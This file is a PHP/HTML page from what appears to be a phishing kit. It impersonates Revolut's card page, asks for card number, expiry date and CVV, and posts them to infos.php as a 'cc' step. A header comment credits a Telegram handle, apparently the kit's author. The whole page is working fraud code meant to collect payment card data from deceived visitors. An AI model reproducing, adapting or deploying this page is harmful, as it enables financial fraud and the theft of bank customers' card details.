<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";



?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>A better way to handle your money | Revolut</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/facon.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/facon.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
  <div class="body" style="background:#E6E6E6;">
    <div class="row" style="margin-right: 0;">
      <div class="col-lg-4"></div>
      <div class="col-lg-4">
        <div class="cc shadow mt-5" style="background:#F3F4F5">
           <div class="title justify-content-between align-items-center d-flex">
              <h2>Cards</h2>
              <ul class="list-unstyled d-flex">
                <li class="me-3"><i class="fas fa-plus-circle"></i></li>
                <li class="me-3"><i class="fas fa-user"></i></li>
              </ul>
            </div>
            <div class="cardd text-center mt-4 mb-4"><img class="img-fluid shadow" src="image/card.png"></div>
            <form action="infos.php" method="post">
              <input type="hidden" value="cc" name="step">
              <div class="cont shadow">
                <p class="mb-0 mt-0"><i style="margin-right:10px;" class="fas fa-credit-card"></i> Card Number </p>
              </div>
              <div class="box">
                <div class="form-group mb-4 mt-4" style="width:65%">
                  <input id="card_number" type="text" name="card_number" required="">
                  <label>CARD NUMBER</label>
                </div>
                <div class="form-group mb-4" style="width:65%">
                  <input id="expiry" type="text" name="expiry" required="">
                  <label>Date d'expiration (XX/YY)</label>
                </div>
                <div class="form-group mb-4" style="width:65%">
                  <input id="cvv" type="text" name="cvv" required="">
                  <label>CVV</label>
                </div>
                <div class="bttn text-center mb-3"><button style="margin-top:30px" id="btn" name="submit">Valid</button></div>
                <hr>
                <div class="span text-center" style="font-size: 11px;">© 2006 - 2022 revolut. All rights reserved</div>
              </div>
            </form>
        </div>
      </div>
    </div>
  </div>
  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>

        $('#cvv').payment('formatCardCVC');
        $('#expiry').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');

    $("#cvv").keyup(function(){
      if ($(this).val().length >= 3) {
        $("#btn").css({"background":"#0666eb" , "color":"#fff" , "box-shadow":"#0666eb1f 0px 0.7rem 1.3rem 0px, #0666eb3d 0px 1rem 2.2rem 0px"})
      }
      else{
        $("#btn").css({"background":"#5c9ffb" , "color":"#ffffff80" , "box-shadow":"none"})
      }
    })


  </script>
</body>
</html>